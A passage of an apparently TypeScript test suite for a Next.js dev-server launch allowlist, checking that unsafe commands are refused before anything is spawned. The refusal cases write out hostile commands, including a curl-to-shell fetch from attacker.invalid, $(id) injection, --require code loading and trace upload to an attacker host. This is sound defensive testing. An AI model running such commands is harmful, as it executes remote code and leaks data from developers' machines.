    { command: 'npm run build', reason: 'script-not-declared' },
    { command: 'pnpm run', reason: 'script-not-declared' },
    { command: 'pnpm', reason: 'script-not-declared' },
    { command: 'yarn Dev', reason: 'script-not-declared' },
    // Options for the package manager, and unsafe dev-server arguments.
    {
      command: 'pnpm --filter storefront run dev',
      reason: 'argument-not-allowed',
      argument: 1,
      planted: 'storefront',
    },
    { command: 'pnpm run --filter storefront dev', reason: 'argument-not-allowed', argument: 2 },
    {
      command: 'npm run dev --node-options=--require=/tmp/x.js',
      reason: 'argument-not-allowed',
      argument: 3,
      planted: '/tmp/x.js',
    },
    { command: 'npm run dev --port 4174', reason: 'argument-not-allowed', argument: 3 },
    { command: 'pnpm run dev --inspect', reason: 'argument-not-allowed', argument: 3 },
    {
      command: 'pnpm run dev --inspect=0.0.0.0:9229',
      reason: 'argument-not-allowed',
      argument: 3,
      planted: '0.0.0.0:9229',
    },
    {
      command: "pnpm run dev '$(id)'",
      reason: 'argument-not-allowed',
      argument: 3,
      planted: '$(id)',
    },
    { command: 'npm run dev -- --port 4174 --', reason: 'argument-not-allowed', argument: 6 },
    { command: 'next dev -r /tmp/x.js', reason: 'argument-not-allowed', argument: 2 },
    { command: 'next dev --require=/tmp/x.js', reason: 'argument-not-allowed', argument: 2 },
    { command: "next dev 'two words'", reason: 'argument-not-allowed', argument: 2 },
    {
      command: 'node node_modules/next/dist/bin/next dev --inspect-brk',
      reason: 'argument-not-allowed',
      argument: 3,
    },
  ])('refuses $command ($reason)', ({ command, reason, argument, planted }) => {
    const error = expectErr(judged(command), 'DEV_SERVER_LAUNCH_FAILED', reason);

    expect(error.details).toStrictEqual(argument === undefined ? { reason } : { reason, argument });
    expect(error.hint).toContain('package.json');
    if (planted !== undefined) {
      expect(errorSurfaces(error)).not.toContain(planted);
    }
  });

  it('names the accepted forms in the hint of a refused executable', () => {
    const error = expectErr(
      judged("sh -c 'curl https://attacker.invalid/payload | sh'"),
      'DEV_SERVER_LAUNCH_FAILED',
      'executable-not-allowed',
    );

    for (const form of [
      'pnpm run dev',
      'yarn dev',
      'next dev',
      'node_modules/next/dist/bin/next',
    ]) {
      expect(error.hint).toContain(form);
    }
    expect(error.hint).toContain('package.json script');
  });

  it('admits no package-manager run when the manifest could not be read', () => {
    const unread = policyContext({ scripts: undefined });

    for (const command of ['pnpm run dev', 'npm run-script dev', 'yarn dev', 'bun run dev']) {
      expectErr(judged(command, unread), 'DEV_SERVER_LAUNCH_FAILED', 'script-not-declared');
    }
    // The framework forms need no manifest.
    expect(expectOk(judged('next dev', unread)).form).toBe('framework-cli');
  });

  it('fails closed when an injected collaborator throws or answers anything but true', () => {
    const throwing = (): never => {
      throw new Error('unavailable');
    };

    expectErr(
      judged(`${SERVICE_NODE} ${POLICY_CLI} dev`, policyContext({ realpath: throwing })),
      'DEV_SERVER_LAUNCH_FAILED',
      'executable-not-allowed',
    );
    expectErr(
      judged(`node ${POLICY_CLI} dev`, policyContext({ isTrustedFile: throwing })),
      'DEV_SERVER_LAUNCH_FAILED',
      'dev-cli-untrusted',
    );
    const truthy = (() => 'yes') as unknown as (path: string) => boolean;
    expectErr(
      judged(`node ${POLICY_CLI} dev`, policyContext({ isTrustedFile: truthy })),
      'DEV_SERVER_LAUNCH_FAILED',
      'dev-cli-untrusted',
    );
  });
});

describe('checkLaunchCommand: only the Next.js dev options DEV_SERVER_ARGUMENT_ALLOWLIST lists', () => {
  it('is a frozen table of the port, hostname and bundler options, and nothing else', () => {
    expect(Object.isFrozen(DEV_SERVER_ARGUMENT_ALLOWLIST)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_ARGUMENT_ALLOWLIST.booleanOptions)).toBe(true);
    expect(Object.isFrozen(DEV_SERVER_ARGUMENT_ALLOWLIST.valuedOptions)).toBe(true);
    expect(DEV_SERVER_ARGUMENT_ALLOWLIST.booleanOptions).toStrictEqual([
      '--turbo',
      '--turbopack',
      '--webpack',
      '--disable-source-maps',
      '--no-server-fast-refresh',
    ]);
    expect(
      DEV_SERVER_ARGUMENT_ALLOWLIST.valuedOptions.map(({ long, short }) => [short, long]),
    ).toStrictEqual([
      ['-p', '--port'],
      ['-H', '--hostname'],
    ]);
    for (const option of DEV_SERVER_ARGUMENT_ALLOWLIST.valuedOptions) {
      expect(Object.isFrozen(option)).toBe(true);
    }
  });

  it.each([
    'next dev --port 4173',
    'next dev -p 4173 -H 127.0.0.1 --turbopack',
    'next dev --hostname=127.0.0.1 --port=4173',
    'next dev -H [::1] -p 65535',
    'next dev --port 1 --hostname localhost',
    'next dev --turbo --webpack --disable-source-maps --no-server-fast-refresh',
    'next dev --hostname ::1 --port 4173',
    'node node_modules/next/dist/bin/next dev --port 4173 --hostname localhost',
    `${SERVICE_NODE} ${POLICY_CLI} dev -p 4173 --webpack`,
    'pnpm run dev -p 4174 --turbopack',
    'npm run dev -- --hostname=127.0.0.1 --port=4174',
  ])('accepts %s', (command) => {
    expectOk(judged(command));
  });

  it.each([
    // A positional is the directory `next dev` serves: never one outside the project.
    { command: 'next dev /home/dev/private', argument: 2, planted: '/home/dev/private' },
    { command: 'next dev .', argument: 2 },
    {
      command: 'node node_modules/next/dist/bin/next dev ../../private',
      argument: 3,
      planted: '../../private',
    },
    { command: 'pnpm run dev /elsewhere', argument: 3, planted: '/elsewhere' },
    { command: 'bun run dev /elsewhere', argument: 3, planted: '/elsewhere' },
    { command: 'yarn dev /elsewhere', argument: 2, planted: '/elsewhere' },
    { command: 'npm run dev -- /elsewhere', argument: 4, planted: '/elsewhere' },
    { command: 'next dev --port 4173 elsewhere', argument: 4, planted: 'elsewhere' },
    // Options that send data off the machine, read files, attach a debugger or load code.
    {
      command: 'next dev --experimental-upload-trace https://attacker.invalid/ingest',
      argument: 2,
      planted: 'attacker.invalid',
    },
    {
      command: 'next dev --experimental-upload-trace=https://attacker.invalid/ingest',
      argument: 2,
      planted: 'attacker.invalid',
    },
    {
      command: 'pnpm run dev --experimental-upload-trace=https://attacker.invalid/ingest',
      argument: 3,
      planted: 'attacker.invalid',
    },
    { command: 'next dev --inspect', argument: 2 },
    { command: 'next dev --inspect=0.0.0.0:9229', argument: 2, planted: '0.0.0.0:9229' },
    // Downloads and runs mkcert, which installs a local CA into the user's trust stores.
    { command: 'next dev --experimental-https', argument: 2 },
    { command: 'next dev --experimental-https-key /tmp/k.pem', argument: 2, planted: 'k.pem' },
    { command: 'next dev --experimental-https-cert /tmp/c.pem', argument: 2, planted: 'c.pem' },
    { command: 'next dev --experimental-https-ca /tmp/ca.pem', argument: 2, planted: 'ca.pem' },
    { command: 'next dev --experimental-cpu-prof', argument: 2 },
    { command: 'next dev --internal-trace', argument: 2 },
    { command: 'next dev --experimental-next-config-strip-types', argument: 2 },
    { command: "next dev -e 'process.exit(0)'", argument: 2, planted: 'process.exit' },
    { command: 'next dev --require /tmp/x.js', argument: 2, planted: '/tmp/x.js' },
    { command: 'next dev --import=/tmp/x.mjs', argument: 2, planted: '/tmp/x.mjs' },
    { command: 'next dev --keepAliveTimeout 5', argument: 2 },
    { command: 'next dev -- --port 4173', argument: 2 },
    // A valued option needs one valid value, in an accepted spelling.
    { command: 'next dev -p 0', argument: 3 },
    { command: 'next dev -p 70000', argument: 3 },
    { command: 'next dev -p abc', argument: 3 },
    { command: 'next dev -p 04173', argument: 3 },
    { command: 'next dev --port=0', argument: 2 },
    { command: 'next dev --port=', argument: 2 },
    { command: 'next dev -p', argument: 2 },
    { command: 'next dev -p=4173', argument: 2 },
    { command: 'next dev --port --inspect', argument: 3 },
    { command: 'next dev -H -p 4173', argument: 3 },
    { command: "next dev -H 'two words'", argument: 3 },
    { command: 'next dev --hostname=$(id)', argument: 2, planted: '$(id)' },
    // A dev server listens on loopback only, where the extension's host permissions reach it.
    { command: 'next dev --hostname 0.0.0.0', argument: 3, planted: '0.0.0.0' },
    { command: 'next dev -H 192.168.1.20 -p 4173', argument: 3, planted: '192.168.1.20' },
    { command: 'next dev --hostname=dev-box.local', argument: 2, planted: 'dev-box.local' },
    { command: 'next dev -H localhost.attacker.invalid', argument: 3, planted: 'attacker' },
    { command: 'next dev --turbopack=1', argument: 2 },
  ])('refuses $command as argument-not-allowed at $argument', ({ command, argument, planted }) => {
    const error = expectErr(judged(command), 'DEV_SERVER_LAUNCH_FAILED', 'argument-not-allowed');

    expect(error.details).toStrictEqual({ reason: 'argument-not-allowed', argument });
    if (planted !== undefined) {
      expect(errorSurfaces(error)).not.toContain(planted);
    }
  });

  it('derives the refusal hint from the allowlist, naming every admitted option and no refused one', () => {
    const error = expectErr(
      judged('next dev --inspect'),
      'DEV_SERVER_LAUNCH_FAILED',
      'argument-not-allowed',
    );

    for (const option of DEV_SERVER_ARGUMENT_ALLOWLIST.booleanOptions) {
      expect(error.hint).toContain(option);
    }
    for (const option of DEV_SERVER_ARGUMENT_ALLOWLIST.valuedOptions) {
      expect(error.hint).toContain(`${option.short}/${option.long}`);
    }
    for (const refused of ['--inspect', '--experimental-upload-trace', '--require']) {
      expect(error.hint).not.toContain(refused);
    }
  });
});

describe('checkLaunchAssignment: Next.js switches a launch command may set', () => {
  it.each(['NEXT_TELEMETRY_DISABLED', 'NEXT_OTEL_VERBOSE', 'NEXT_PUBLIC_API_BASE'])(
    'allows %s',
    (name) => {
      expect(checkLaunchAssignment(name, '1', POSIX)).toBeUndefined();
    },
  );

  it.each([
    { name: 'NEXT_PRIVATE_DEV_DIR', value: '/home/dev/private' },
    { name: 'NEXT_TRACE_UPLOAD_FULL', value: '1' },
    { name: 'NEXT_DIST_DIR', value: '/tmp/out' },
    { name: 'NEXT_RUNTIME', value: 'edge' },
  ])(
    'refuses $name as env-assignment-not-allowed, though the service forwards it from its own environment',
    ({ name, value }) => {
      expect(checkLaunchAssignment(name, value, POSIX)).toBe('env-assignment-not-allowed');
      expect(checkLaunchAssignment(name.toLowerCase(), value, WINDOWS)).toBe(
        'env-assignment-not-allowed',
      );
      expect(isForwardedToDevServer(name, POSIX)).toBe(true);
    },
  );

  it.each([
    { command: 'NEXT_PRIVATE_DEV_DIR=/home/dev/private next dev', planted: '/home/dev/private' },
    { command: 'NEXT_TRACE_UPLOAD_FULL=1 next dev', planted: 'NEXT_TRACE_UPLOAD_FULL' },
    { command: 'NEXT_TELEMETRY_DISABLED=1 NEXT_DIST_DIR=/tmp/out next dev', planted: '/tmp/out' },
  ])(
    'parseLaunchCommand refuses $command before judging the executable',
    ({ command, planted }) => {
      const parsed = parseLaunchCommand(command, POSIX);

      const error = expectErr(parsed, 'DEV_SERVER_LAUNCH_FAILED', 'env-assignment-not-allowed');
      expect(error.details?.['position']).toBe(command.startsWith('NEXT_TELEMETRY') ? 2 : 1);
      expect(errorSurfaces(error)).not.toContain(planted);
    },
  );
});

describe('checkLaunchCommand: the -- separator, as each package manager reads it', () => {
  it.each([
    'npm run dev',
    'npm run dev --',
    'npm run dev -- --port 4174',
    'npm run-script dev -- -p 4174 --turbopack',
    'pnpm run dev --port 4174',
    'yarn dev --port 4174',
    'yarn run dev --port 4174',
    'bun run dev --webpack',
    'bun run dev --port 4174',
  ])('accepts %s', (command) => {
    expect(expectOk(judged(command))).toStrictEqual({ form: 'package-script', script: 'dev' });
  });

  it.each([
    // pnpm, Yarn and Bun hand `--` to the script, where Next.js would read
    // every option after it as a directory.
    { command: 'pnpm run dev -- --port 4174', argument: 3 },
    { command: 'pnpm run dev --', argument: 3 },
    { command: 'yarn dev -- --port 4174', argument: 2 },
    { command: 'yarn run dev -- --port 4174', argument: 3 },
    { command: 'bun run dev -- --webpack', argument: 3 },
    // npm reads an option before `--` as its own configuration.
    { command: 'npm run dev --port 4174', argument: 3 },
    { command: 'npm run dev -p 4174', argument: 3 },
    { command: 'npm run dev --webpack', argument: 3 },
    { command: 'npm run-script dev --port 4174', argument: 3 },
    { command: 'npm run dev -- --port 4174 -- --inspect', argument: 6 },
  ])('refuses $command as argument-not-allowed at $argument', ({ command, argument }) => {
    const error = expectErr(judged(command), 'DEV_SERVER_LAUNCH_FAILED', 'argument-not-allowed');

    expect(error.details).toStrictEqual({ reason: 'argument-not-allowed', argument });
  });

  it('advertises each runner as it takes options, never pnpm with --', () => {
    const refusals = [
      expectErr(judged('sh -c true'), 'DEV_SERVER_LAUNCH_FAILED', 'executable-not-allowed'),
      expectErr(
        judged('pnpm run dev -- --port 4174'),
        'DEV_SERVER_LAUNCH_FAILED',
        'argument-not-allowed',
      ),
    ];

    for (const error of refusals) {
      expect(error.hint).toContain('"pnpm run dev --port 4174"');
      expect(error.hint).toContain('"npm run dev -- --port 4174"');
      for (const separated of ['pnpm run dev -- ', 'yarn dev -- ', 'bun run dev -- ']) {
        expect(error.hint).not.toContain(separated);
      }
    }
  });
});

/** A `node_modules` directory in its own sandbox, at `mode` (applied past the umask). */
function modulesDirectory(label: string, mode = 0o755): string {
  const directory = join(makeSandbox(label), 'node_modules');
  mkdirSync(directory);
  chmodSync(directory, mode);
  return directory;
}

/** Whether this host has POSIX owners and mode bits for the trust checks to read. */
const POSIX_HOST = process.platform !== 'win32';

describe('isTrustedNodePathDirectory', () => {
  it.runIf(POSIX_HOST)(
    'trusts an existing directory owned by this user that only this user can write',
    () => {
      for (const mode of [0o700, 0o750, 0o755]) {
        expect(isTrustedNodePathDirectory(modulesDirectory('trusted-modules', mode))).toBe(true);
      }
    },
  );

  it.runIf(POSIX_HOST)('refuses a directory its group or anyone else can write', () => {
    for (const mode of [0o775, 0o757, 0o777, 0o1777]) {
      expect(isTrustedNodePathDirectory(modulesDirectory('writable-modules', mode))).toBe(false);
    }
  });

  it('refuses a missing path and a regular file', () => {
    const sandbox = makeSandbox('missing-modules');
    const file = join(sandbox, 'node_modules');
    writeFileSync(file, '');

    expect(isTrustedNodePathDirectory(join(sandbox, 'absent', 'node_modules'))).toBe(false);
    expect(isTrustedNodePathDirectory(file)).toBe(false);
  });

  it.runIf(POSIX_HOST)('follows a symlink to the directory it names', () => {
    const trustedLink = join(makeSandbox('linked-modules'), 'node_modules');
    symlinkSync(modulesDirectory('linked-target', 0o755), trustedLink);
    const writableLink = join(makeSandbox('linked-modules'), 'node_modules');
    symlinkSync(modulesDirectory('linked-target', 0o777), writableLink);

    expect(isTrustedNodePathDirectory(trustedLink)).toBe(true);
    expect(isTrustedNodePathDirectory(writableLink)).toBe(false);
  });

  it.runIf(POSIX_HOST && process.getuid?.() === 0)('refuses a directory another user owns', () => {
    const directory = modulesDirectory('foreign-modules', 0o755);
    chownSync(directory, 65_534, 65_534);

    expect(isTrustedNodePathDirectory(directory)).toBe(false);
  });
});

describe('checkLaunchCommand: an assigned NODE_PATH names only trusted directories', () => {
  it('asks the trust check about every entry and refuses the command when one is untrusted', () => {
    const second = '/home/dev/elsewhere/node_modules';
    const isTrustedDirectory = vi.fn((path: string) => path === BORROWED_MODULES);

    const error = expectErr(
      judged(
        `NODE_PATH=${BORROWED_MODULES}:${second} next dev`,
        policyContext({ isTrustedDirectory }),
      ),
      'DEV_SERVER_LAUNCH_FAILED',
      'node-path-not-allowed',
    );

    expect(isTrustedDirectory.mock.calls).toStrictEqual([[BORROWED_MODULES], [second]]);
    expect(error.details).toStrictEqual({ reason: 'node-path-not-allowed' });
    expect(error.hint).toContain('node_modules');
    expect(errorSurfaces(error)).not.toContain('elsewhere');
  });

  it('splits a Windows NODE_PATH on ; and matches the name case-insensitively', () => {
    const isTrustedDirectory = vi.fn((path: string) => path.length > 0);
    const context = policyContext({
      projectRoot: 'C:\\work\\atlas-console',
      platform: WINDOWS,
      isTrustedDirectory,
    });

    expectOk(
      judged("node_path='C:\\repo\\node_modules;D:\\shared\\Node_Modules' next dev", context),
    );

    expect(isTrustedDirectory.mock.calls).toStrictEqual([
      ['C:\\repo\\node_modules'],
      ['D:\\shared\\Node_Modules'],
    ]);
  });

  it('consults nothing for a command without a NODE_PATH, or judged without its assignments', () => {
    const isTrustedDirectory = vi.fn(() => false);
    const context = policyContext({ isTrustedDirectory });

    expectOk(judged('NEXT_TELEMETRY_DISABLED=1 next dev', context));
    expectOk(checkLaunchCommand({ file: 'next', args: ['dev'] }, context));

    expect(isTrustedDirectory).not.toHaveBeenCalled();
  });

  it('refuses a NODE_PATH that never passed the syntactic check, and fails closed on a throwing or truthy check', () => {
    expectErr(
      checkLaunchCommand(
        { file: 'next', args: ['dev'], env: { NODE_PATH: ATTACKER_PATH } },
        policyContext({ isTrustedDirectory: () => true }),
      ),
      'DEV_SERVER_LAUNCH_FAILED',
      'node-path-not-allowed',
    );
    const throwing = (): never => {
      throw new Error('unavailable');
    };
    const truthy = (() => 'yes') as unknown as (path: string) => boolean;
    for (const isTrustedDirectory of [throwing, truthy]) {
      expectErr(
        judged(`NODE_PATH=${BORROWED_MODULES} next dev`, policyContext({ isTrustedDirectory })),
        'DEV_SERVER_LAUNCH_FAILED',
        'node-path-not-allowed',
      );
    }
  });

  it('judges which program runs first: a refused executable is refused as such', () => {
    expectErr(
      judged('NODE_PATH=/home/dev/elsewhere/node_modules sh -c true'),
      'DEV_SERVER_LAUNCH_FAILED',
      'executable-not-allowed',
    );
  });

  describe('with the real trust checks', () => {
    /** A context that injects nothing but the project root: every default in force. */
    function realContext(projectRoot: string): LaunchCommandContext {
      return {
        projectRoot,
        scripts: ['dev'],
        platform: process.platform,
        isTrustedFile: undefined,
        isTrustedDirectory: undefined,
        realpath: undefined,
      };
    }

    it.runIf(POSIX_HOST)('refuses a NODE_PATH directory that does not exist', () => {
      const missing = join(makeSandbox('absent-modules'), 'node_modules');

      const error = expectErr(
        judged(`NODE_PATH=${missing} next dev`, realContext(makeProject('real-trust'))),
        'DEV_SERVER_LAUNCH_FAILED',
        'node-path-not-allowed',
      );
      expect(errorSurfaces(error)).not.toContain(missing);
    });

    it.runIf(POSIX_HOST)(
      'refuses a world-writable and a group-writable NODE_PATH directory',
      () => {
        for (const mode of [0o777, 0o775]) {
          const writable = modulesDirectory('writable-node-path', mode);

          expectErr(
            judged(`NODE_PATH=${writable} next dev`, realContext(makeProject('real-trust'))),
            'DEV_SERVER_LAUNCH_FAILED',
            'node-path-not-allowed',
          );
        }
      },
    );

    it.runIf(POSIX_HOST)(
      'accepts the end-to-end sample app shape: a borrowed, trusted node_modules and its framework CLI',
      () => {
        const nodeModules = modulesDirectory('borrowed-real', 0o755);
        const cli = join(nodeModules, 'next', 'dist', 'bin', 'next');
        mkdirSync(join(cli, '..'), { recursive: true });
        writeFileSync(cli, "#!/usr/bin/env node\nrequire('../../dist/cli');\n");
        chmodSync(cli, 0o644);
        const command = `NEXT_TELEMETRY_DISABLED=1 DEBUGGEN_LOG_LEVEL=warn NODE_PATH=${nodeModules} ${process.execPath} ${cli} dev --webpack --port 4175`;

        expect(expectOk(judged(command, realContext(makeProject('sample-copy'))))).toStrictEqual({
          form: 'node-framework-cli',
        });
      },
    );

    it.runIf(POSIX_HOST)(
      "accepts the browser fixture shape: the quoted service Node and the project's own framework CLI",
      () => {
        const projectRoot = makeProjectWithTrustedCli('browser-copy');
        const command = `NEXT_TELEMETRY_DISABLED=1 "${process.execPath}" node_modules/next/dist/bin/next dev --port 4176 --hostname 127.0.0.1`;

        expect(expectOk(judged(command, realContext(projectRoot)))).toStrictEqual({
          form: 'node-framework-cli',
        });
      },
    );
  });
});

describe('isTrustedDevCliFile', () => {
  /** A framework CLI written into its own sandbox's `node_modules`, at `mode`. */
  function cliFile(mode: number): string {
    const path = join(makeSandbox('trusted-cli'), 'node_modules', 'next', 'dist', 'bin', 'next');
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, "#!/usr/bin/env node\nrequire('../../dist/cli');\n");
    chmodSync(path, mode);
    return path;
  }

  const posixOnly = process.platform !== 'win32';

  it.runIf(posixOnly)(
    'trusts a regular file owned by this user that only this user can write',
    () => {
      for (const mode of [0o600, 0o644, 0o755]) {
        expect(isTrustedDevCliFile(cliFile(mode))).toBe(true);
      }
    },
  );

  it.runIf(posixOnly)('refuses a file its group or anyone else can write', () => {
    for (const mode of [0o664, 0o646, 0o666, 0o777]) {
      expect(isTrustedDevCliFile(cliFile(mode))).toBe(false);
    }
  });

  it('refuses a missing path and a directory', () => {
    const sandbox = makeSandbox('trusted-cli');

    expect(isTrustedDevCliFile(join(sandbox, 'node_modules', 'next', 'dist', 'bin', 'next'))).toBe(
      false,
    );
    expect(isTrustedDevCliFile(sandbox)).toBe(false);
  });

  it.runIf(posixOnly)(
    'follows a symlink to the file it names, as a pnpm node_modules layout holds',
    () => {
      const trustedLink = join(makeSandbox('linked-cli'), 'next');
      symlinkSync(cliFile(0o644), trustedLink);
      const writableLink = join(makeSandbox('linked-cli'), 'next');
      symlinkSync(cliFile(0o666), writableLink);

      expect(isTrustedDevCliFile(trustedLink)).toBe(true);
      expect(isTrustedDevCliFile(writableLink)).toBe(false);
    },
  );

  it.runIf(posixOnly && process.getuid?.() === 0)('refuses a file another user owns', () => {
    const path = cliFile(0o644);
    chownSync(path, 65_534, 65_534);

    expect(isTrustedDevCliFile(path)).toBe(false);
  });
});

describe('DevServerLauncher.launch: the command policy', () => {
  /** The dev-server scripts every harness here reports: the fixture's and a `dev` script. */
  const DEV_SERVER_SCRIPTS: readonly string[] = Object.freeze(['dev', DEFAULT_SCRIPT.name]);

  function policyHarness(options: HarnessOptions = {}): Harness {
    return createHarness({
      ...options,
      detection: { devServerScripts: DEV_SERVER_SCRIPTS, ...options.detection },
    });
  }

  /** A framework CLI at `path`, written by this user at `mode`. */
  function writeCli(path: string, mode = 0o644): string {
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, "#!/usr/bin/env node\nrequire('../../dist/cli');\n");
    chmodSync(path, mode);
    return path;
  }

  /** Assert a refused launch minted, spawned and registered nothing, and echoed nothing planted. */
  function expectNothingStarted(harness: Harness, error: DebuggenError, planted?: string): void {
    expect(harness.issuer.issue).not.toHaveBeenCalled();
    expect(harness.spawner.spawn).not.toHaveBeenCalled();
    expect(harness.launcher.list()).toEqual([]);
    if (planted !== undefined) {
      expect(errorSurfaces(error)).not.toContain(planted);
      expect(serializedRecords(harness.records)).not.toContain(planted);
    }
  }

  it.each([
    {
      command: "sh -c 'curl https://attacker.invalid/payload | sh'",
      reason: 'executable-not-allowed',
      planted: 'attacker.invalid',
    },
    {
      command: "bash -c 'id > /tmp/owned'",
      reason: 'executable-not-allowed',
      planted: '/tmp/owned',
    },
    {
      command: '/bin/sh ./scripts/start.sh',
      reason: 'executable-not-allowed',
      planted: 'start.sh',
    },
    { command: 'env sh', reason: 'executable-not-allowed' },
    { command: 'npx next dev', reason: 'executable-not-allowed' },
    {
      command: `node -e 'require("node:child_process").execSync("id")'`,
      reason: 'dev-cli-untrusted',
      planted: 'child_process',
    },
    {
      command: 'node --require /tmp/x.js node_modules/next/dist/bin/next dev',
      reason: 'dev-cli-untrusted',
      planted: '/tmp/x.js',
    },
    { command: 'node /tmp/evil.js', reason: 'dev-cli-untrusted', planted: 'evil.js' },
    // The fixture project installs nothing, so its framework CLI is missing.
    { command: 'node node_modules/next/dist/bin/next dev', reason: 'dev-cli-untrusted' },
    { command: 'pnpm run undeclared', reason: 'script-not-declared', planted: 'undeclared' },
    { command: 'pnpm exec next dev', reason: 'executable-not-allowed' },
    {
      command: 'pnpm --filter storefront run dev',
      reason: 'argument-not-allowed',
      planted: 'storefront',
    },
    {
      command: 'npm run dev --node-options=--require=/tmp/x.js',
      reason: 'argument-not-allowed',
      planted: '/tmp/x.js',
    },
    { command: 'pnpm run dev --inspect', reason: 'argument-not-allowed' },
    { command: "pnpm run dev '$(id)'", reason: 'argument-not-allowed', planted: '$(id)' },
    { command: 'yarn install', reason: 'executable-not-allowed' },
    {
      command: 'curl https://attacker.invalid/payload',
      reason: 'executable-not-allowed',
      planted: 'attacker.invalid',
    },
  ])(
    'refuses $command ($reason) before minting a credential or spawning',
    async ({ command, reason, planted }) => {
      const harness = policyHarness();

      const result = await harness.launcher.launch({ projectRoot: harness.projectRoot, command });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', reason);
      expectNothingStarted(harness, error, planted);
    },
  );

  it.runIf(process.platform !== 'win32')(
    "refuses the project's framework CLI when another user could have written it",
    async () => {
      const projectRoot = makeProject('writable-cli');
      writeCli(join(projectRoot, 'node_modules', 'next', 'dist', 'bin', 'next'), 0o666);
      const harness = policyHarness({ projectRoot });

      const result = await harness.launcher.launch({
        projectRoot,
        command: `"${process.execPath}" node_modules/next/dist/bin/next dev`,
      });

      const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'dev-cli-untrusted');
      expectNothingStarted(harness, error);
    },
  );

  it('refuses a detected dev script whose name Yarn reads as its own command', async () => {
    const harness = policyHarness({
      detection: {
        packageManager: 'yarn',
        devScript: { name: 'install', command: 'next dev' },
        devServerScripts: ['install'],
      },
    });

    const result = await harness.launcher.launch({ projectRoot: harness.projectRoot });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'executable-not-allowed');
    expectNothingStarted(harness, error);
  });

  it('refuses a package-manager run when detection could not read the manifest', async () => {
    const harness = createHarness({ detection: { devScript: null, devServerScripts: null } });

    const result = await harness.launcher.launch({
      projectRoot: harness.projectRoot,
      command: `pnpm run ${DEFAULT_SCRIPT.name}`,
    });

    const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', 'script-not-declared');
    expectNothingStarted(harness, error);
  });

  it.each([
    { command: 'pnpm run dev', file: 'pnpm', args: ['run', 'dev'], script: 'dev' },
    {
      command: 'pnpm run dev --port 4174',
      file: 'pnpm',
      args: ['run', 'dev', '--port', '4174'],
      script: 'dev',
    },
    {
      command: 'npm run dev -- --port 4174',
      file: 'npm',
      args: ['run', 'dev', '--', '--port', '4174'],
      script: 'dev',
    },
    { command: 'yarn dev', file: 'yarn', args: ['dev'], script: 'dev' },
    { command: 'bun run dev', file: 'bun', args: ['run', 'dev'], script: 'dev' },
    { command: 'next dev --port 4173', file: 'next', args: ['dev', '--port', '4173'] },
  ])(
    'spawns $command as given, recording the script a package-manager run starts',
    async ({ command, file, args, script }) => {
      const harness = policyHarness();

      await launchReady(harness, { command });

      const call = harness.spawner.call(0);
      expect(call.command).toBe(file);
      expect(call.args).toEqual(args);
      expect(call.options.shell).toBe(false);
      const record = harness.launcher.list()[0];
      expect(record?.command).toBe(file);
      if (script === undefined) {
        expect(record).not.toHaveProperty('script');
      } else {
        expect(record?.script).toBe(script);
      }
    },
  );

  it.runIf(process.platform !== 'win32')(
    "accepts the browser fixture shape with the real defaults: the quoted service Node and the project's own framework CLI",
    async () => {
      const projectRoot = makeProject('fixture-copy');
      writeCli(join(projectRoot, 'node_modules', 'next', 'dist', 'bin', 'next'));
      const harness = policyHarness({ projectRoot });

      await launchReady(
        harness,
        {
          command: `NEXT_TELEMETRY_DISABLED=1 "${process.execPath}" node_modules/next/dist/bin/next dev --port 4176 --hostname 127.0.0.1`,
        },
        0,
        'http://127.0.0.1:4176',
      );

      const { command, args, options } = harness.spawner.call(0);
      expect(command).toBe(process.execPath);
      expect(args).toEqual([
        'node_modules/next/dist/bin/next',
        'dev',
        '--port',
        '4176',
        '--hostname',
        '127.0.0.1',
      ]);
      expect(options.env['NEXT_TELEMETRY_DISABLED']).toBe('1');
    },
  );

  it.runIf(process.platform !== 'win32')(
    'accepts the end-to-end sample app shape with the real defaults: assignments, the absolute service Node and a borrowed, symlinked framework CLI',
    async () => {
      // The pnpm layout: node_modules/next links into node_modules/.pnpm.
      const toolchain = makeSandbox('borrowed-toolchain');
      const nodeModules = join(toolchain, 'node_modules');
      const stored = join(nodeModules, '.pnpm', 'next@16.3.5', 'node_modules', 'next');
      writeCli(join(stored, 'dist', 'bin', 'next'));
      symlinkSync(stored, join(nodeModules, 'next'));
      // A NODE_PATH directory must be writable by this user alone, whatever the umask.
      chmodSync(nodeModules, 0o755);
      const cli = join(nodeModules, 'next', 'dist', 'bin', 'next');
      const harness = policyHarness();

      await launchReady(
        harness,
        {
          command: `NEXT_TELEMETRY_DISABLED=1 DEBUGGEN_LOG_LEVEL=warn NODE_PATH=${nodeModules} ${process.execPath} ${cli} dev --webpack --port 4175`,
        },
        0,
        'http://127.0.0.1:4175',
      );

      const { command, args, options } = harness.spawner.call(0);
      expect(command).toBe(process.execPath);
      expect(args).toEqual([cli, 'dev', '--webpack', '--port', '4175']);
      expect(options.env['NEXT_TELEMETRY_DISABLED']).toBe('1');
      expect(options.env['DEBUGGEN_LOG_LEVEL']).toBe('warn');
      expect(options.env['NODE_PATH']).toBe(nodeModules);
      expect(harness.launcher.list()[0]).not.toHaveProperty('script');
    },
  );
});

/**
 * A fixture project whose own framework CLI is installed as a trusted file —
 * a regular file owned by this user that nobody else can write — so a launch
 * through Node is judged on its arguments rather than refused as untrusted.
 */
function makeProjectWithTrustedCli(label: string): string {
  const projectRoot = makeProject(label);
  const cli = join(projectRoot, 'node_modules', 'next', 'dist', 'bin', 'next');
  mkdirSync(join(cli, '..'), { recursive: true });
  writeFileSync(cli, "#!/usr/bin/env node\nrequire('../../dist/cli');\n");
  chmodSync(cli, 0o644);
  return projectRoot;
}

/**
 * Launch `command` for a fresh harness project and assert the refusal: the
 * `reason`, and nothing minted, spawned or registered — with the `planted`
 * text, when given, absent from every error surface and log record.
 */
async function expectRefusedBeforeStart(
  harness: Harness,
  command: string,
  reason: string,
  planted?: string,
): Promise<DebuggenError> {
  const result = await harness.launcher.launch({ projectRoot: harness.projectRoot, command });

  const error = expectErr(result, 'DEV_SERVER_LAUNCH_FAILED', reason);
  expect(harness.issuer.issue).not.toHaveBeenCalled();
  expect(harness.spawner.spawn).not.toHaveBeenCalled();
  expect(harness.launcher.list()).toEqual([]);
  if (planted !== undefined) {
